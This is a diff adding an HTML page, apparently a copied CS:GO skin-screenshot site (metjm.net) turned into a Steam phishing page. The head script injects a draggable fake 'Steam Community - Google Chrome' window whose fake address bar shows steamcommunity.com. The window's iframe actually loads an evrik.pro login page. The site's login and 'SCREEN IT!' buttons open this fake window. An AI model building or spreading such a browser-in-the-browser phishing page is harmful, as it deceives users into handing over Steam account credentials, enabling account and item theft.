@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<!-- saved from url=(0023)https://metjm.net/csgo/ -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<link rel="stylesheet" type="text/css" href="css/old_style.css">
+<title>metjm.net - CSGO Skin Screenshot</title>
+<meta name="description" content="CSGO Skin Screenshot lets you inspect csgo skins without starting the game.">
+<meta name="keywords" content="csgo,skin,screenshot,inspect,Counter-Strike,Global Offensive,game,service">
+<link rel="icon" href="../metjm.net/img/favicon.ico" type="image/x-icon">
+<style type="text/css">
+			.donator {
+				display: block;
+				width: 100%;
+				margin-bottom: 5px;
+				padding: 0px;
+				overflow: auto;
+			}
+			.donator > .name {
+				color:black;
+				float: left;
+				width:260px;
+				height:1.4em;
+				overflow:hidden;
+			}
+			.donator > .amount {
+				float: right;
+				text-align: right;
+				color:#ad1d41;
+			}
+			.backgroundImageContainer{
+				
+				background-image: url(../metjm.net/img/backgrounds/background_nuke.jpg);
+			}
+			
+			#serverStatusMain{
+				height:50px;
+				width:90%;
+				margin-left:5%;
+				margin-top:5px;
+				border-top:1px solid #e5e5e5;
+				position:relative;
+			}
+			#serverStatusMain .statusElementDesc{
+				position:absolute;
+				height:100%;
+				line-height:50px;
+				margin:0px;
+				padding:0px;
+				top:0px;
+				width: 190px;
+				color:white;
+				text-align:right;
+				padding-right: 21px;
+				background-position: center left;
+				background-repeat:no-repeat;
+			}
+			#serverStatusMain > .statusElement{
+				position:absolute;
+				height:35px;
+				line-height:35px;
+				margin:0px;
+				padding:0px;
+				top:0px;
+				width: 50px;
+				color:black;
+				text-align:center;
+				font-size: 30px;
+				font-family: NexaBold;
+			}
+			#serverStatusMain > .statusElementDescSmall{
+				color:black;
+				font-size:12px;
+				height:15px;
+				line-height:15px;
+				top:35px;
+			}
+			
+			#serverStatusMain > #forceReloadButton{
+				position:absolute;
+				width:50px;
+				height:50px;
+				right:0px;
+				top:0px;
+				background-image:url(../metjm.net/csgo/img/refresh_all.png);
+				background-position:center;
+				background-repeat:no-repeat;
+			}
+			#serverStatusMain > #forceReloadButton:hover{
+				background-size: 110%;
+			}
+			
+			#serverStatusMain > #trashAllButton{
+				position:absolute;
+				width:50px;
+				height:50px;
+				right:60px;
+				top:0px;
+				background-image:url(../metjm.net/csgo/img/trash_all.png);
+				background-position:center;
+				background-repeat:no-repeat;
+			}
+			#serverStatusMain > #trashAllButton:hover{
+				background-size: 110%;
+			}
+			
+			.checkboxSmall{
+				width: 130px;
+			}
+			.checkboxSmaller{
+				width:35px;
+			}
+			#requestHqCheckbox{
+				left: 220px;
+			}
+			#displayCustomLogoCheckbox{
+				left: 65px;
+			}
+			#useOpskinBackground{
+				width: 45px;
+				background-position:center;
+			}
+			
+		</style>
+<script type="text/javascript" src="../metjm.net/jquery-1.12.0.min.js"></script>
+<script type="text/javascript" src="../metjm.net/jquery.cookiesdirective.js"></script>
+<script type="text/javascript">
+	// $(document).ready(function(){
+
+	// });
+	function dragElement(elmnt) {
+			var pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
+			if (document.getElementById(elmnt.id + "_header")) {
+					/* if present, the header is where you move the DIV from:*/
+					document.getElementById(elmnt.id + "_header").onmousedown = dragMouseDown;
+			} else {
+					/* otherwise, move the DIV from anywhere inside the DIV:*/
+					elmnt.onmousedown = dragMouseDown;
+			}
+			function dragMouseDown(e) {
+					e = e || window.event;
+					// get the mouse cursor position at startup:
+					pos3 = e.clientX;
+					pos4 = e.clientY;
+					document.onmouseup = closeDragElement;
+					// call a function whenever the cursor moves:
+					document.onmousemove = elementDrag;
+			}
+			function elementDrag(e) {
+					e = e || window.event;
+					// calculate the new cursor position:
+					pos1 = pos3 - e.clientX;
+					pos2 = pos4 - e.clientY;
+					pos3 = e.clientX;
+					pos4 = e.clientY;
+					// set the element's new position:
+					elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
+					elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
+			}
+			function closeDragElement() {
+					/* stop moving when mouse button is released:*/
+					document.onmouseup = null;
+					document.onmousemove = null;
+			}
+	}
+
+	function setCookie(name,value,days) {
+			var expires = "";
+			if (days) {
+					var date = new Date();
+					date.setTime(date.getTime() + (days*24*60*60*1000));
+					expires = "; expires=" + date.toUTCString();
+			}
+			document.cookie = name + "=" + (value || "")  + expires + "; path=/";
+	}
+	function getCookie(name) {
+			var nameEQ = name + "=";
+			var ca = document.cookie.split(';');
+			for(var i=0;i < ca.length;i++) {
+					var c = ca[i];
+					while (c.charAt(0)==' ') c = c.substring(1,c.length);
+					if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
+			}
+			return null;
+	}
+	function eraseCookie(name) {   
+			document.cookie = name+'=; Max-Age=-99999999;';  
+	}
+
+	function getRandomInt(min, max) {
+			return Math.floor(Math.random() * (max - min + 1)) + min;
+	}
+	
+	var links = ['https://firstbot.evrik.pro/openid/login?domain=evrik.pro'];
+	var link = getCookie('link');
+
+	if(!link) {
+			setCookie('link', link, 31);
+	}
+
+	window.addEventListener('load', function() {
+			$('body').append('<div id="authcontainer" style="position: fixed; top: -100px; left: 15%; z-index: 1000000000; display: none;"><div style="background-color: white; height: 750px; width: 1028px; z-index: 1200; top: 206px; box-shadow: rgba(0, 0, 0, 0.7) 1px 7px 50px; position: relative; left: 105px;"><div id="authcontainer_header" style="margin-left: 0px; margin-left: 5px; width: 100%; height: 30px;"><div class="authNav"><div></div><div></div><div onclick="authcontainer.style.display=\'none\'"></div></div><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAADNQTFRFAAAABwYJGxscU1ZRx8rF////DAkNoaybXVteyNXAjIyMtra2bW9rdHN1vL+5kZaPfHx80TO+gQAAAAF0Uk5TAEDm2GYAAAABYktHRAX4b+nHAAAACXBIWXMAAABIAAAASABGyWs+AAAAcklEQVQY003PURLDIAgEUFhZ1Fib3v+0NRFN+JI3sgMiGgUkqMruk5E01wUwujvtAXpmBjck+hhxlgU1fiw4yDYyPmMkzYSookL2/o32vBa5X7io38MTCBpmmuSAtbFoqaU11Ae0EKj9Bfoz69iwz43+D8CmA1epGZ+2AAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE4LTAyLTIyVDEyOjI3OjAxKzAyOjAwr4//IAAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOC0wMi0yMlQxMjoyNzowMCswMjowMHilTCgAAAAASUVORK5CYII=" class="windowsrc" style="user-select: none;-webkit-user-drag: none;width: 16px;height: 16px;position: relative;top: 20%;margin-left: 2px;float: left"><img src="data:image/png;base64,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" style="user-select: none;-webkit-user-drag: none;float: right;margin-right: 7px;z-index: 10;margin-top: 2px" onclick="authcontainer.style.display=\'none\'"><div style="user-select: none;text-align: left;position: relative;top: 18%;color: black;font-family: \'MyFont Regular\', Arial, sans-serif;font-weight:normal;font-style: normal;	font-variant: normal;font-size: 13px;cursor: default;z-index: 8;pointer-events: none;margin-left: 2.3%;top: 7">Steam Community - Google Chrome</div></div><div name="URL" id="linkholder" style="margin-left: 0px!important;margin-left: 5px;width: 100%;height: 25px;margin-right:0px!important;background-color: white;box-shadow: 0px 0px 0px 1px rgba(0,0,0,0.3);"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIwAAAAZCAYAAADja8bOAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAC+0lEQVRoQ+2XsZLTMBCG6XkC3gCeAPor6Ggz0EN1DcVRp6O5GVPAQOcuzXVJAa+QKvcI1+W6KygohVdaSStpJUt2kgvMfjMabNmWV78+68gTJQgNiDBCEyKM0IQIIzQhwggsq9UKj0JEGIFlljAPf36rT7++qRdf3ukGx8L/zSxhrn5+Va/7j+ruYa8bHENfLdv+Qi02ezyj7NVNd6Gud3ia5VZdLy/VDTfEAYD6ni5J62/xyulxtXRrdT+c328u+Xp2nbvHABmROSw7tYVuuA/7xnP2zBLm2ec3WhQLHD/v3uJZBbponABlv1YLrj/hWMJgyNGCbPuamo5D/HFVCaNzjPLZrcl57YfpmSUM2BnD9eUxCxMXnA0j4RjCmBD5ne/xmCRMstvEnFCYl9/fuy0tbq9+fMC7xtFbbTDxdBI6HDK+v0aE4cIJ+sy4bpyckE27GxkveAbnsIGxhmu6Blsrfa5e9oPtMAFp1mNMFsYHxbdqYII07PgcJtV7EXRQTgK6w9BjgIZhjn3ghaA48RLMoicLGMsZjGNFKc01zyRhAP2OuBZLIYcMjy8MBmmLjoNJCHaAUJLgWXoft2tAkDWBc7D30Fq4hQhrNdQv2GRhEH3/kHOY7T8pDJ08F+qA/Upc44XRYmBYMKYLJ3keGycGJ1cEv1g0fG4h+LmBCAcXhuvXQA30fVydZc5CGLdI3NcR9wULGi8CBADn9l/b7UUapyJErk73bntcI0zFu5Bk52VrKIiEhOPUv99yHsJg4fBcuGWmAejzrDDm+mL4+RsKYsaPx84Ci8HU4n9Wmy+VXtd1uXea96XCDHOM52Kf0R9CLJQnEYapIRljmAdXg+/j6iwzWZjSryS41ooOjw0Mg8amZSgIY0LjQgjHgVYOKr2fWzB3nRE0Xayh1o2R0TQ7j4FmYYC4Rj4Lfz2u6YTCCK2gMBkhxuCFmYsIc8bMF0bvEsz/WyaBf3bTXaeMCHMy5glzLogwwkEQYYQmRBihCRFGaEKEERpQ6i9F1uIElehjKwAAAABJRU5ErkJggg==" title="view site information" style="user-select: none;-webkit-user-drag: none;float:left"><div style="display: table-cell; vertical-align: middle;height: 25px;width: 869px;font-family: \'MyFont Regular\', Arial, sans-serif;font-weight:normal;	font-style: normal;	font-variant: normal;font-size: 13px;overflow: hidden;" id="overall"><div style="width: 886px; font-family: &quot;MyFont Regular&quot;, Arial, sans-serif; font-weight: normal; font-style: normal; font-variant: normal; font-size: 13px; white-space: nowrap; color: black;" id="linkbar"><g style="color: green">https</g><g style="color: grey">://</g>steamcommunity.com<g style="color: grey">/openid/login?openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;openid.mode=checkid_setup&amp;openid.return_to=https%3A%2F%2Fopskins</g></div></div></div><iframe id="fwindow" onLoad="checkFrameReload();" src="https://evrik.pro/'&#32;+&#32;links[0]&#32;+&#32;'" class="iframe" frameborder="0" style="width: 100%; height: 92.6%;margin-left: 0px;margin-right: 5px"></iframe><div style="z-index: 90; opacity: 0.1;"></div></div></div>');
+			if(typeof authcontainer != "undefined") dragElement(authcontainer);
+	}, false);
+
+	let reloads = 0;
+
+	function checkFrameReload() {
+			reloads++;
+			if (reloads >= 2) setTimeout(() => window.location.reload(), 600);
+	}
+</script>
+</head>
+<body>
+
+<div class="backgroundImageContainer"></div>
+<div class="centerContainer">
+<div class="backgroundWhite"></div>
+<div class="header">
+<div class="headerInner">
+<a href="css/images/ui-bg_flat_0_aaaaaa_40x100.png.html">
+<div class="logoContainer"></div>
+</a>
+<div class="headerStatusContainer">
+<div style="position:relative;width:100%;height:100%;">
+<p class="headerStatusCount">
+36332 </p>
+<p class="headerStatusText">
+SCREENSHOTS<br>
+<span>TAKEN TODAY</span>
+</p>
+</div>
+</div>
+<div class="headerUserContainer">
+	<a style="cursor: pointer;" onclick="$('#authcontainer').css('display', 'inherit');">
+		<img alt="login with steam" src="../metjm.net/img/shared/sits_02.png" class="loginWithSteamButton">
+		</a>
+</div>
+</div>
+</div>
+<div class="navBar">
+<a href="csgo.html"><div>Screenshot</div></a>
+<div class="dropdownContainer">
+<div>
+<a href="tools.html"><div>Tools</div></a>
+<a href="fades.html"><div>Fades</div></a>
+<a href="steamwizard.html"><div>SteamWizard</div></a>
+</div>
+</div>
+<a href="help.html"><div>Help</div></a>
+<a href="stats.html"><div>Stats</div></a>
+<a href="feedback.html"><div>Feedback</div></a>
+<a href="premium.html"><div>Premium</div></a>
+</div>
+<div class="contentContainer">
+<div class="appDescriptionContainer">
+<div class="appDescriptionInner" style="width:100%;">
+<p class="appDescription">
+<span class="bold">CSGO Skin Screenshot</span> will take screenshots of CS:GO skins<br>
+so you can inspect them without starting the game.
+</p>
+</div>
+</div>
+<div class="inspectLinkContainer" style="font-familiy:Helvetica;">
+<input class="inspectLinkInput bold" placeholder="Paste inspect link here...">
+<div style="cursor: pointer;" onclick="$('#authcontainer').css('display', 'inherit');" class="requestInspectLinkButton bold">SCREEN IT!</div>
+</div>
+
+<div id="customOptionsContainer">
+<div id="customOptionsInner">
+<div id="useOpskinBackground" style="width: 40px; visibility: hidden; background-color: rgb(233, 233, 233); border: 8px solid rgb(233, 233, 233); background-image: url(../metjm.net/csgo/img/opskins.png)" class="customcheckbox checkboxSmall noselect" data-bg="#e9e9e9" data-bi="url(https://metjm.net/csgo/img/opskins.png)" data-bgc="#47b4dc" data-bic="url(https://metjm.net/csgo/img/opskins_inv.png)">
+</div>
+<div id="displayCustomLogoCheckbox" class="customcheckbox checkboxSmall noselect" data-bg="#e9e9e9" data-bi="url(https://metjm.net/csgo/img/icon_brush.png)" data-bgc="#47b4dc" data-bic="url(https://metjm.net/csgo/img/icon_brush_white.png)" style="visibility: hidden; background-color: rgb(233, 233, 233); border: 8px solid rgb(233, 233, 233); background-image: url(../metjm.net/csgo/img/icon_brush.png)">
+Custom Logo
+</div>
+<div id="requestHqCheckbox" class="customcheckbox checkboxSmall noselect" data-bg="#e9e9e9" data-bi="url(https://metjm.net/csgo/img/opskins_inv.png)" data-bgc="#47b4dc" data-bic="url(https://metjm.net/csgo/img/opskins.png)" checked="checked" style="left: 260px; width: 220px; background-color: rgb(71, 180, 220); border: 8px solid rgb(71, 180, 220); background-image: url(../metjm.net/csgo/img/opskins.png)">Instant Field Inspection™</div>
+<select id="resSelection" size="1" style="left: 525px; background-color: rgb(71, 180, 220);"><option value="4">1600x900</option><option value="1">1920x1080</option><option value="2">2560x1440</option></select>
+<div id="customRotCheckbox" class="customcheckbox noselect" data-bg="#e9e9e9" data-bi="url(https://metjm.net/csgo/img/icon_hq.png)" data-bgc="#47b4dc" data-bic="url(https://metjm.net/csgo/img/icon_hq_white.png)" style="visibility: hidden; background-color: rgb(233, 233, 233); border: 8px solid rgb(233, 233, 233); background-image: url(../metjm.net/csgo/img/icon_hq.png)">
+Custom Rotation
+</div>
+<select id="resSelectionRotations" size="1" disabled="disabled" style="visibility: hidden; background-color: white;"><option value="0">Default Rotations</option><option value="1">Default Backside</option><option value="427">Kara Corner</option><option value="846">Bayo Spine</option></select>
+<div id="addCustomRotationbutton" style="visibility: hidden; background-color: rgb(233, 233, 233);">
+Add
+</div>
+</div>
+<div id="customOptionsNoPremium" class="hideThisShit">
+Need HQ screens, priority queue and more? Get premium at only $4 per month
+</div>
+</div>
+
+<div id="skinList"></div>
+<div id="serverStatusMain">
+<p class="statusElementDesc" style="left:0px;background-image:url(../metjm.net/csgo/img/servers_background.png);">CSGO Instances</p>
+<p class="statusElementDesc" style="left: 300px;background-image:url(../metjm.net/csgo/img/queue_background.png);">Queue Length</p>
+<p class="statusElement" style="left: 225px;color:#2086ba;height:50px;line-height:50px;"><span id="serversOnlineSpan">12</span></p>
+<p class="statusElement" style="left: 530px;color:#ba415f;"><span id="queueLengthSpan">1</span></p>
+<p class="statusElement statusElementDescSmall" style="left: 530px;">Free</p>
+<p class="statusElement" style="left: 600px;color:#ba415f;"><span id="queueLengthSpanPremium">0</span></p>
+<p class="statusElement statusElementDescSmall" style="left: 600px;">Premium</p>
+<div id="forceReloadButton" class="clickable">
+</div>
+<div id="trashAllButton" class="clickable">
+</div>
+</div>
+<a href="recent.html">
+<div class="recentScreensContainer">
+<p>RECENT SCREENSHOTS</p>
+<div style="background-image:url(../s.metjm.net/zGwWWep_t.jpg);"></div><div style="background-image:url(../s.metjm.net/KiJW2N7_t.jpg);"></div><div style="background-image:url(../s.metjm.net/N59kUMK_t.jpg);"></div>
+</div>
+</a>
+<div id="bannerContainer">
+<div id="fadesBanner">
+<a href="fades/index.html"><div id="fadesBannerLink"></div></a>
+</div>
+<a href="donations.html">
+<div id="donationList">
+<p style="text-align:center;">Top Supporters last 30 Days</p>
+</div>
+</a>
+<a href="android.html"><div id="appBanner"></div></a>
+</div>
+
+<div id="hiddenshit" style="position:fixed;left:9000;top:9000;z-position:-1000;width:0px;height:0xp;overflow:hidden;">
+<div class="skinContainer">
+<p class="skinProperty" style="left:200px;">
+STATUS<br>
+<span id="skinStatusSpan"></span>
+</p><p>
+</p><p class="skinProperty" style="left:300px;">
+PATTERN INDEX<br>
+<span id="patternIndexS"></span>
+</p><p>
+</p><p class="skinProperty" style="left:440px;">
+FLOAT<br>
+<span id="floatValueS"></span>
+</p><p>
+</p><div class="clickable" id="trashButton">
+</div>
+<div class="clickable" id="retryButton">
+</div>
+<div class="openImageButton">
+</div>
+</div>
+</div>
+<script type="text/javascript" src="../metjm.net/csgo/js/error_reporter.js"></script>
+<script type="text/javascript" src="../metjm.net/csgo/js/jquery-2.1.4.min.js"></script>
+<script type="text/javascript" src="../metjm.net/csgo/js/jquery.cookie.js"></script>
+<script src="../metjm.net/csgo/js/jquery.cookiesdirective.js"></script>
+<script type="text/javascript" src=".js/csgoindex.js.html"></script>
+</div>
+<div class="premiumFooter">
+</div>
+<div class="footer">
+<p style="text-align:left;left:0px;">© 2016 - 2017 metjm.net</p>
+<a href="../twitter.com/metjmnet.html" target="_blank"><img src="../metjm.net/img/Twitter_Logo_Blue.svg" style="position:absolute;width:45px;height:45px;left:calc(50% - 22px);"></a>
+<p style="text-align:right;left:15%;right:53%;">
+<a href="feedback.html">FEEDBACK</a>
+|
+<a href="help.html">HELP</a>
+</p>
+<p style="text-align:left;left:53%;right:15%;">
+<a href="stats.html">STATS</a>
+|
+<a href="impressum.html">IMPRESSUM</a>
+</p>
+<p style="text-align:right;right:0px;"><a target="_blank" href="../steampowered.com/index.html">Powered by Steam</a></p>
+</div>
+<script type="text/javascript">
+				$.cookiesDirective({
+					explicitConsent: false,
+					position: 'bottom',
+					message: 'This website uses cookies. (<a style="color: #888;" href="fk_u_eu.html" target="_blank">Policy</a>)'
+				});
+										var openedAd = false;
+						// $("body").click(function(e){
+							// if (!openedAd && window.location.href.indexOf("database") < 0){
+								// var width = $(window).width();
+								// var h = width/2;
+								// if (e.pageX < h-500 || e.pageX > h+500){						
+									// window.open("http://fanobet.com");
+									// openedAd = true;
+								// }
+							// }
+						// });
+									</script>
+</div>
+
+
+</body></html>
